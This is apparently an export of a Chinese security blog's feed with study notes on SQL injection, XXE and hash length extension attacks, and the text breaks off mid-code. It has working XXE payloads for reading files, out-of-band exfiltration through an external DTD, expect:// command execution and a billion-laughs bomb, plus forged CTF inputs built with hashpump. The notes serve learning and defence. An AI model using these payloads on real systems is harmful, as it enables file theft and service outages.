数据库名.表名</p><p>DESCRIBE 提供有关一个表的列信息。col<em>name 可以是一个列名或是一个包含 SQL 通配符字符 “%” 和 “</em>” 的字符串。这种情况下，输出结果将会是匹配到的列的信息。如果列名里边没有空字符或特殊字符，wild 没有必要使用引号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc news tid;</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">| Field | Type             | Null | Key | Default | Extra          |</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">| tid   | int(10) unsigned | NO   | PRI | NULL    | auto_increment |</div><div class="line">+-------+------------------+------+-----+---------+----------------+</div><div class="line">1 row in set (0.01 sec)</div></pre></td></tr></table></figure><p>可以判断字段是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;);</div><div class="line">mysql_select_db(&apos;demo&apos;);</div><div class="line">$test = mysql_query(&apos;Describe cdb_posts first&apos;);</div><div class="line">$test = mysql_fetch_array($test);</div></pre></td></tr></table></figure><p>$test[0]返回的是该字段的名称,比如我要查询first字段,返回的就是first</p><p>如果此字段不存在返回的就是NULL,通过这样可以判断一个字段是否存在</p><p><strong>参考：<a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="external">http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/</a></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;收集一些关于SQL注入的姿势，长期更新:D&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;关于mysql字段名和保留字冲突的问题&quot;&gt;&lt;a href=&quot;#关于mysql字段名和保留字冲突的问题&quot; class=&quot;headerlink&quot; title=&quot;关于m
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XML External Entity Injection --笔记</title>
    <link href="http://yoursite.com/2018/08/14/XXE%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/08/14/XXE笔记/</id>
    <published>2018-08-14T02:44:32.742Z</published>
    <updated>2018-08-14T03:57:01.359Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><p><strong>DTD 引用方式(简要了解)：</strong> </p><p><strong>1.DTD 内部声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</div></pre></td></tr></table></figure><p><strong>2.DTD 外部引用</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素 SYSTEM “外部DTD的URI”&gt;</div></pre></td></tr></table></figure><p><strong>3. 引用公共DTD</strong></p><p>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt; </div><div class="line">&lt;!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN”</div><div class="line">“http://mybatis.org/dtd/mybatis-3-config.dtd”&gt;</div><div class="line">以!DOCTYPE开始,configuration是文档根元素名称；PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；EN表示DTD语言是英语；最后是DTD的URL；</div></pre></td></tr></table></figure><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素 </li><li>属性 </li><li>实体 </li><li>PCDATA  </li><li>CDATA </li></ul><p>重点了解实体</p><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</strong> </p><p><strong>内部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</div></pre></td></tr></table></figure><p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;在GET中需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号 </p><p><strong>外部实体声明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</div></pre></td></tr></table></figure><p>不同的语言支持的协议不同 </p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180813/6iIjK6JHf4.png?imageslim" alt="mark"></p><p><strong>参数实体声明</strong> </p><p>参数实体实际上不是在具体实例化文档中使用，而是在DTD文档内部被使用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % 实体名称 “实体的值”&gt;</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE xee [</div><div class="line">       &lt;!ENTITY % name &quot;XXE&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;/xxe&gt;</div></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1.文件读取"></a>1.文件读取</h3><p>攻击利用大致分两个情形，一种是有回显的情况，一种是无会回显的情况</p><p><strong>有回显：</strong></p><p>1.直接读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">       &lt;!ENTITY b SYSTEM &quot;file:///e://tool/1.txt&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">       &lt;!ENTITY % d SYSTEM &quot;http://localhost/attack1.dtd&quot;&gt;</div><div class="line">%d;]&gt;</div><div class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>的内容为： <code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></p><p>3.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE a SYSTEM &quot;http://xxx.xxx.xxx/attack.dtd&quot;&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>内容同上不变 </p><p><strong>没有回显</strong></p><p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=e://tool/1.txt&quot;&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/attack.dtd&quot;&gt;</div><div class="line">%dtd;</div><div class="line">%mydata;</div><div class="line">]&gt;</div></pre></td></tr></table></figure><p>其中<code>attack.dtd</code>的内容为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &apos;http://localhost/?%file;&apos;&gt;&quot;</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure><p>最里层的嵌套里必须为字符实体</p><blockquote><p>踩了很多坑，需要注意的是，dtd里的内容url需要添加”;”,最里层的嵌套的%需要为字符实体，需要添加”%all“</p><p>若要读取文件本身包含&lt;等字符，如PHP文件，需要利用php://filter的base64编码绕过 </p></blockquote><p>如果网站开启了报错，也可以直接在报错信息中查看数据</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180813/9AhHCbCeBi.png?imageslim" alt="mark"></p><p>当然可以在apache访问日志中查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /attack.dtd HTTP/1.0&quot; 200 85</div><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /?YWJj HTTP/1.0&quot; 200 1751</div><div class="line">::1 - - [13/Aug/2018:17:29:51 +0800] &quot;GET /XXE.php HTTP/1.1&quot; 200 1550</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /attack.dtd HTTP/1.0&quot; 200 85</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /?YWJj HTTP/1.0&quot; 200 1751</div><div class="line">::1 - - [13/Aug/2018:17:31:25 +0800] &quot;GET /XXE.php HTTP/1.1&quot; 200 1550</div></pre></td></tr></table></figure><h3 id="2-内网信息探测及攻击"><a href="#2-内网信息探测及攻击" class="headerlink" title="2.内网信息探测及攻击"></a>2.内网信息探测及攻击</h3><p>根据不同xml解析器会得到不同的回显报错结果 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><p>结合其他的漏洞比如：struts2 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="3-执行系统命令"><a href="#3-执行系统命令" class="headerlink" title="3.执行系统命令"></a>3.执行系统命令</h3><p>php环境下，xml命令执行需要php装有expect扩展，但是该扩展默认没有安装 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">&lt;!ELEMENT name ANY &gt;</div><div class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h3 id="4-DOS攻击"><a href="#4-DOS攻击" class="headerlink" title="4.DOS攻击"></a>4.<strong>DOS攻击</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">   &lt;!DOCTYPE lolz [</div><div class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</div><div class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</div><div class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</div><div class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</div><div class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</div><div class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</div><div class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</div><div class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</div><div class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</div></pre></td></tr></table></figure><h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p><strong>一、禁用外部实体</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">PHP：</div><div class="line">libxml_disable_entity_loader(true);</div><div class="line"></div><div class="line">JAVA:</div><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(false);</div><div class="line"></div><div class="line">Python：</div><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure><p><strong>二、尽量不要让用户直接提交XML代码,如果一定要,则需过滤用户提交的XML数据</strong>  </p><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 </p><h2 id="jarvis-oj-API调用"><a href="#jarvis-oj-API调用" class="headerlink" title="jarvis-oj API调用"></a>jarvis-oj API调用</h2><p>Content - Type头限制提交的数据为json，但其实服务器也可以接受其他的数据</p><p>这里就需要去修改Content - Type头为<code>application/xml</code> ，根据提示，读文件/home/ctf/flag.txt，然后POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;!DOCTYPE xxe [</div><div class="line">       &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;</div><div class="line">]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a></p><p><a href="http://www.4o4notfound.org/index.php/archives/29/" target="_blank" rel="external">http://www.4o4notfound.org/index.php/archives/29/</a></p><p><a href="https://www.hackersb.cn/hacker/211.html" target="_blank" rel="external">https://www.hackersb.cn/hacker/211.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727829287&amp;idx=1&amp;sn=4a68b346b3551c8576faa1834db1ae67&amp;chksm=805088afb72701b95a36dcc993a9fcfee4636b1ed97713a1b6adc66bf355bb3253cb09cc2939&amp;mpshare=1&amp;scene=23&amp;srcid=0812OTnZAKmFxpZZxGIcPhDY#rd" target="_blank" rel="external">jd</a></p><p><a href="https://www.secpulse.com/archives/6256.html" target="_blank" rel="external">https://www.secpulse.com/archives/6256.html</a></p><p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">https://thief.one/2017/06/20/1/</a></p><p><a href="http://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="external">http://www.w3school.com.cn/dtd/index.asp</a></p><p><a href="http://www.freebuf.com/vuls/175451.html" target="_blank" rel="external">http://www.freebuf.com/vuls/175451.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DTD简介&quot;&gt;&lt;a href=&quot;#DTD简介&quot; class=&quot;headerlink&quot; title=&quot;DTD简介&quot;&gt;&lt;/a&gt;DTD简介&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。&lt;/s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>哈希长度扩展攻击（hash length extension attacks）--笔记</title>
    <link href="http://yoursite.com/2018/08/14/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95/"/>
    <id>http://yoursite.com/2018/08/14/hash长度扩展/</id>
    <published>2018-08-14T02:44:32.722Z</published>
    <updated>2018-08-14T03:21:12.394Z</updated>
    
    <content type="html"><![CDATA[<p>在密码学和计算机安全中，<strong>长度扩展攻击（Length extension attacks）</strong>是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在<em>消息</em>与<em>密钥</em>的长度已知的情形下，所有采取了 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。注意，由于密钥散列消息认证码（HMAC）并未采取 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 的构造方式，因此不会受到此类攻击的影响（如HMAC-MD5、HMAC-SHA1）。SHA-3算法对此攻击免疫。(源自<a href="https://zh.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB" target="_blank" rel="external">维基百科</a>)</p><p>攻击的要点在于：</p><ul><li>攻击者可以控制message</li><li>攻击者需要知道key的长度，如不知道可以考虑暴力破解</li><li>攻击已经知道了包含key的一个消息的hash值</li><li>hash算法使用了Merkle–Damgård construction进行数据的压缩（比如MD5、SHA-1等）并采取 <strong>H</strong>(<em>密钥</em> ∥ <em>消息</em>) 构造</li></ul><p>攻击可以达到的效果在于，如果知道一个原消息哈希值H(key∥M1)及其(key∥M1)长度，对于任意的字符串M2，攻击者可以计算出H(pad(key∥M1) + M2)的值，而不需要知道是key及M1是多少 </p><p>原因在于基于Merkle–Damgård构造哈希函数有类似的特点：</p><p>以区块为单位操作数据（MD5, SHA1, SHA256的区块长度是512 bits，大多数message的长度不会刚好可以被哈希函数的区块长度整除。这样一来，message就必须被填充(padding)至区块长度的整数倍） </p><p>每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量 ，初始化向量是定义好的，在最后一块的时候，才会将其对应的链接变量转换为hash值。 </p><p>由已知的MD5值逆向得到对应的链接变量，利用得到的链接变量对填充后的新加的消息进行哈希算法，最后得到hash值。（具体算法：<a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html）" target="_blank" rel="external">http://blog.chinaunix.net/uid-27070210-id-3255947.html）</a></p><p>如何去防止攻击？使用HMAC可以有效避免攻击；另外针对Flickr API等将参数签名的应用来说，secret放置在 参数末尾也能防止这种攻击。 比如 MD5(m+secret)，希望推导出 MD5(m+secret||padding||m’)，结果由于自动附加secret在末尾的关系，会变成MD5(m||padding||m’||secret)，从而导致Length Extension run不起来。</p><p>工具可以采用的有<strong><a href="https://github.com/bwall/HashPump" target="_blank" rel="external">HashPump</a></strong> 及<strong><a href="https://github.com/amlweems/hexpand" target="_blank" rel="external">hexpand</a></strong> ，不同在于HashPump需要提供原始消息数据，而hexpand则不需要</p><hr><p>下面以两个CTF题为例：</p><p><strong><a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="external">实验吧-让我进去</a></strong></p><p>首先burpsuit抓包查看，特别的地方在于cookie前两个字段</p><p><code>sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0;</code></p><p>尝试修改source字段为1，返回了原代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;</div><div class="line">$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!</div><div class="line"></div><div class="line">$username = $_POST[&quot;username&quot;];</div><div class="line">$password = $_POST[&quot;password&quot;];</div><div class="line"></div><div class="line">if (!empty($_COOKIE[&quot;getmein&quot;])) &#123;</div><div class="line">    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</div><div class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</div><div class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</div><div class="line">            die (&quot;The flag is &quot;. $flag);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die (&quot;You are not an admin! LEAVE.&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));</div><div class="line"></div><div class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</div><div class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    if ($_COOKIE[&quot;source&quot;] != 0) &#123;</div><div class="line">        echo &quot;&quot;; // This source code is outputted here</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>分析源码可以知道，sample-hash字段为进过MD5加密的字符串”adminadmin”加未知的secret,只知道secret长度为15。要得到flag，需要getmein字段的值为进过MD5加密的输入的username和password加secret的值。并且固定了username为admin,password不能为admin。</p><p>这里就用到哈希长度拓展攻击，目前我们知道字符串secret+adminadmin的MD5hash值，secret的长度为15，我们需要添加一个字符串M2，构造字符串为secret+admin+M2，并计算出其MD5值</p><p>这里使用hashpump,附加数据至少1位以上 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~/HashPump# hashpump</div><div class="line">Input Signature: 571580b26c65f306376d4f64e53cb5c7</div><div class="line">Input Data: admin</div><div class="line">Input Key Length: 20</div><div class="line">Input Data to Add: venture</div><div class="line">57545bbf734b02db716893eefe9899ad</div><div class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00venture</div></pre></td></tr></table></figure><p>抓包添加cookie字段getmein，对password反urldecode一下,16进制urlencode即将\x换成% </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getmein=57545bbf734b02db716893eefe9899ad</div><div class="line"></div><div class="line">username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00venture</div></pre></td></tr></table></figure><p>就可以得到flag</p><p><strong><a href="http://web.jarvisoj.com:32778/" target="_blank" rel="external">Jarvis OJ-flag在管理员手里</a> </strong></p><p>index.php~源码泄露 ,查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">    body &#123;</div><div class="line">        background:gray;</div><div class="line">        text-align:center;</div><div class="line">    &#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">    &lt;?php</div><div class="line">        $auth = false;</div><div class="line">        $role = &quot;guest&quot;;</div><div class="line">        $salt =</div><div class="line">        if (isset($_COOKIE[&quot;role&quot;])) &#123;</div><div class="line">            $role = unserialize($_COOKIE[&quot;role&quot;]);</div><div class="line">            $hsh = $_COOKIE[&quot;hsh&quot;];</div><div class="line">            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123;</div><div class="line">                $auth = true;</div><div class="line">            &#125; else &#123;</div><div class="line">                $auth = false;</div><div class="line">            &#125;</div><div class="line">        &#125; else &#123;</div><div class="line">            $s = serialize($role);</div><div class="line">            setcookie(&apos;role&apos;,$s);</div><div class="line">            $hsh = 